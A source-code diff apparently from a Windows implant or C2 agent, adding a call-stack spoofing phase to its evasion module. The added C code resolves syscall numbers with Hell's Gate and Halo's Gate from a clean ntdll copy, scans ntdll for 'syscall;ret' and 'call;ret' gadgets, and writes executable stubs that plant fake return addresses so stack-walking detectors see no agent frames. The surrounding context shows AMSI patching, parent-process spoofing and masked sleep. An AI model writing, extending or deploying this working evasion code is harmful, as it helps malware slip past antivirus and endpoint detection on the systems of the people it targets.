@@ -158,6 +158,214 @@ int spawn_with_ppid(const char *cmd, const char *parent_name) {
     return 1;
 }
 
+/* ═══════════════════════════════════════════════════════════════════════════
+ * Phase 10: Call-stack spoofing
+ *
+ * 110-byte spoofed indirect-syscall stubs are built in a VirtualAlloc'd page
+ * (RW → write stubs → RX).  Each stub:
+ *   1. sub rsp,8  — opens a slot for the fake return address
+ *   2. slides any stack-passed args (args 5-11) down by one slot
+ *   3. plants a call-preceded RET address from ntdll at [RSP]
+ *   4. issues an indirect syscall via a "syscall;ret" gadget also in ntdll
+ *
+ * The stack-walker sees a coherent ntdll call chain and no agent .text frame.
+ * ═══════════════════════════════════════════════════════════════════════════ */
+
+#define SPOOF_STUB_SIZE 110
+
+static LPVOID    g_spoof_page    = NULL;
+static int       g_spoof_count   = 0;
+static int       g_spoof_ok      = 0;
+static ULONG_PTR g_syscall_gadget = 0;   /* VA of ntdll "syscall;ret" */
+static ULONG_PTR g_spoof_gadget   = 0;   /* VA of ntdll "call;...;ret" (the C3) */
+
+/* Exported spoofed-stub pointers */
+NtAllocVMem_t      g_NtAllocVM    = NULL;
+NtProtVMem_t       g_NtProtVM     = NULL;
+NtCreateThreadEx_t g_NtCreateThread = NULL;
+NtDelayExec_t      g_NtDelayExec  = NULL;
+
+/* ── PE little-endian helpers ─────────────────────────────────────────────── */
+static unsigned short pe_r16(const unsigned char *p, int o) {
+    return (unsigned short)p[o] | ((unsigned short)p[o+1] << 8);
+}
+static unsigned int pe_r32(const unsigned char *p, int o) {
+    return (unsigned int)p[o]        | ((unsigned int)p[o+1] << 8) |
+           ((unsigned int)p[o+2] << 16) | ((unsigned int)p[o+3] << 24);
+}
+
+/* ── SSN resolution: Hell's Gate + Halo's Gate fallback ──────────────────── */
+static unsigned short spoof_get_ssn(HMODULE ntdll, const char *name) {
+    const unsigned char *fn = (const unsigned char *)GetProcAddress(ntdll, name);
+    if (!fn) return 0;
+    /* Unpatched stub: 4C 8B D1  B8 lo hi 00 00  0F 05  C3 */
+    if (fn[0]==0x4C && fn[1]==0x8B && fn[2]==0xD1 && fn[3]==0xB8)
+        return (unsigned short)fn[4] | ((unsigned short)fn[5] << 8);
+    /* Halo's Gate: scan forward neighbours (each stub is 32 bytes apart) */
+    for (int i = 1; i <= 5; i++) {
+        const unsigned char *nb = fn + (i * 32);
+        if (nb[0]==0x4C && nb[1]==0x8B && nb[2]==0xD1 && nb[3]==0xB8) {
+            unsigned short base_ssn = (unsigned short)nb[4] | ((unsigned short)nb[5] << 8);
+            return (base_ssn >= (unsigned short)i) ? base_ssn - (unsigned short)i : 0;
+        }
+    }
+    return 0;
+}
+
+/* ── Scan ntdll .text for "syscall;ret" (0F 05 C3) ──────────────────────── */
+static ULONG_PTR spoof_find_syscall_gadget(ULONG_PTR base) {
+    const unsigned char *dos = (const unsigned char *)base;
+    unsigned int elf = pe_r32(dos, 60);
+    const unsigned char *pe  = dos + elf;
+    unsigned short nsects = pe_r16(pe, 6);
+    unsigned short optsz  = pe_r16(pe, 20);
+    const unsigned char *sec0 = pe + 24 + optsz;
+    for (unsigned short i = 0; i < nsects; i++) {
+        const unsigned char *sec = sec0 + (i * 40);
+        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
+            continue;
+        unsigned int vaddr = pe_r32(sec, 12);
+        unsigned int vsz   = pe_r32(sec, 16);
+        const unsigned char *mem = (const unsigned char *)(base + vaddr);
+        for (unsigned int off = 0; off + 3 <= vsz; off++)
+            if (mem[off]==0x0F && mem[off+1]==0x05 && mem[off+2]==0xC3)
+                return base + vaddr + off;
+    }
+    return 0;
+}
+
+/* ── Scan ntdll .text for "call rel32; ret" — return VA of the C3 byte ──── */
+static ULONG_PTR spoof_find_spoof_gadget(ULONG_PTR base) {
+    const unsigned char *dos = (const unsigned char *)base;
+    unsigned int elf = pe_r32(dos, 60);
+    const unsigned char *pe  = dos + elf;
+    unsigned short nsects = pe_r16(pe, 6);
+    unsigned short optsz  = pe_r16(pe, 20);
+    const unsigned char *sec0 = pe + 24 + optsz;
+    for (unsigned short i = 0; i < nsects; i++) {
+        const unsigned char *sec = sec0 + (i * 40);
+        if (sec[0]!='.' || sec[1]!='t' || sec[2]!='e' || sec[3]!='x' || sec[4]!='t')
+            continue;
+        unsigned int vaddr = pe_r32(sec, 12);
+        unsigned int vsz   = pe_r32(sec, 16);
+        const unsigned char *mem = (const unsigned char *)(base + vaddr);
+        /* Require off >= 5 so mem[off-5] is always in range */
+        for (unsigned int off = 5; off < vsz; off++)
+            if (mem[off-5]==0xE8 && mem[off]==0xC3)
+                return base + vaddr + off;
+    }
+    return 0;
+}
+
+/* ── Write one 110-byte spoofed stub into g_spoof_page ───────────────────── *
+ *
+ * Stub layout (identical to the Nim Phase-10 stubs in agent-nim/syscalls.nim):
+ *  +0   48 83 EC 08               sub  rsp, 8
+ *  +4   4C 8B 5C 24 30            mov  r11, [rsp+0x30]  ─┐
+ *  +9   4C 89 5C 24 28            mov  [rsp+0x28], r11   │ slide args 5-11
+ *  +14  ...                        (× 7 pairs, 10 B each) │ down by 8 bytes
+ *  +74  49 BB <8>                  mov  r11, spoof_gadget ; fake ret addr
+ *  +84  4C 89 1C 24               mov  [rsp], r11
+ *  +88  4C 8B D1                  mov  r10, rcx
+ *  +91  B8 lo hi 00 00            mov  eax, SSN
+ *  +96  FF 25 00 00 00 00         jmp  [rip+0]
+ *  +102 <8>                        → syscall_gadget
+ */
+static void *spoof_make_stub(unsigned short ssn) {
+    if (!g_spoof_page) return NULL;
+    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;
+
+    unsigned char *p = (unsigned char *)g_spoof_page + (g_spoof_count * SPOOF_STUB_SIZE);
+    g_spoof_count++;
+
+    static const unsigned char src_slots[7] = {0x30,0x38,0x40,0x48,0x50,0x58,0x60};
+    static const unsigned char dst_slots[7] = {0x28,0x30,0x38,0x40,0x48,0x50,0x58};
+
+    /* +0: sub rsp, 8 */
+    p[0]=0x48; p[1]=0x83; p[2]=0xEC; p[3]=0x08;
+
+    /* +4..+73: 7 pairs of (mov r11,[rsp+src]; mov [rsp+dst],r11) */
+    int off = 4;
+    for (int i = 0; i < 7; i++) {
+        p[off+0]=0x4C; p[off+1]=0x8B; p[off+2]=0x5C; p[off+3]=0x24; p[off+4]=src_slots[i];
+        p[off+5]=0x4C; p[off+6]=0x89; p[off+7]=0x5C; p[off+8]=0x24; p[off+9]=dst_slots[i];
+        off += 10;
+    } /* off == 74 */
+
+    /* +74: mov r11, spoof_gadget  (49 BB <8-byte LE>) */
+    p[74]=0x49; p[75]=0xBB;
+    memcpy(p + 76, &g_spoof_gadget, 8);
+
+    /* +84: mov [rsp], r11  (4C 89 1C 24) */
+    p[84]=0x4C; p[85]=0x89; p[86]=0x1C; p[87]=0x24;
+
+    /* +88: mov r10, rcx  (4C 8B D1) */
+    p[88]=0x4C; p[89]=0x8B; p[90]=0xD1;
+
+    /* +91: mov eax, SSN  (B8 lo hi 00 00) */
+    p[91]=0xB8; p[92]=(unsigned char)(ssn & 0xFF); p[93]=(unsigned char)(ssn >> 8);
+    p[94]=0x00; p[95]=0x00;
+
+    /* +96: jmp [rip+0]  (FF 25 00 00 00 00) */
+    p[96]=0xFF; p[97]=0x25; p[98]=0x00; p[99]=0x00; p[100]=0x00; p[101]=0x00;
+
+    /* +102: syscall gadget address  (8-byte LE) */
+    memcpy(p + 102, &g_syscall_gadget, 8);
+
+    return (void *)p;
+}
+
+/* ── Public API ───────────────────────────────────────────────────────────── */
+
+void init_stack_spoof(void) {
+    /* Load a clean ntdll copy to read unhooked SSN bytes */
+    HMODULE ntdll_clean = LoadLibraryExW(L"ntdll.dll", NULL,
+                                         DONT_RESOLVE_DLL_REFERENCES);
+    if (!ntdll_clean)
+        ntdll_clean = GetModuleHandleA("ntdll.dll");
+
+    HMODULE ntdll_live = GetModuleHandleA("ntdll.dll");
+    if (!ntdll_live) return;
+
+    /* Resolve SSNs (Hell's Gate / Halo's Gate) */
+    unsigned short ssn_alloc = spoof_get_ssn(ntdll_clean, "NtAllocateVirtualMemory");
+    unsigned short ssn_prot  = spoof_get_ssn(ntdll_clean, "NtProtectVirtualMemory");
+    unsigned short ssn_thr   = spoof_get_ssn(ntdll_clean, "NtCreateThreadEx");
+    unsigned short ssn_delay = spoof_get_ssn(ntdll_clean, "NtDelayExecution");
+
+    /* Scan live (in-memory) ntdll for both gadgets */
+    ULONG_PTR base = (ULONG_PTR)ntdll_live;
+    g_syscall_gadget = spoof_find_syscall_gadget(base);
+    g_spoof_gadget   = spoof_find_spoof_gadget(base);
+
+    if (!g_syscall_gadget || !g_spoof_gadget) return;
+
+    /* Allocate RW page, write stubs, then lock to RX */
+    g_spoof_page = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!g_spoof_page) return;
+
+    g_NtAllocVM      = (NtAllocVMem_t)     spoof_make_stub(ssn_alloc);
+    g_NtProtVM       = (NtProtVMem_t)      spoof_make_stub(ssn_prot);
+    g_NtCreateThread = (NtCreateThreadEx_t)spoof_make_stub(ssn_thr);
+    g_NtDelayExec    = (NtDelayExec_t)     spoof_make_stub(ssn_delay);
+
+    DWORD old;
+    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
+    g_spoof_ok = 1;
+}
+
+void *spoof_syscall_stub(unsigned short ssn) {
+    if (!g_spoof_ok || !g_spoof_page) return NULL;
+    if ((g_spoof_count + 1) * SPOOF_STUB_SIZE > 4096) return NULL;
+
+    /* Briefly re-open for writing, append stub, re-seal */
+    DWORD old;
+    if (!VirtualProtect(g_spoof_page, 4096, PAGE_READWRITE, &old)) return NULL;
+    void *stub = spoof_make_stub(ssn);
+    VirtualProtect(g_spoof_page, 4096, PAGE_EXECUTE_READ, &old);
+    return stub;
+}
+
 void evasion_init(void) {
     patch_fn("amsi.dll",  "AmsiScanBuffer");
     patch_fn("amsi.dll",  "AmsiScanString");
@@ -168,6 +376,7 @@ void evasion_init(void) {
     g_VProt   = (VProt_t)  GetProcAddress(k32,   "VirtualProtect");
     g_NtDelay = (NtDelay_t)GetProcAddress(ntdll, "NtDelayExecution");
     find_text();
+    init_stack_spoof();
 }
 
 /* ── sleep_masked lives in .evasn — executes while .text is PAGE_NOACCESS ─
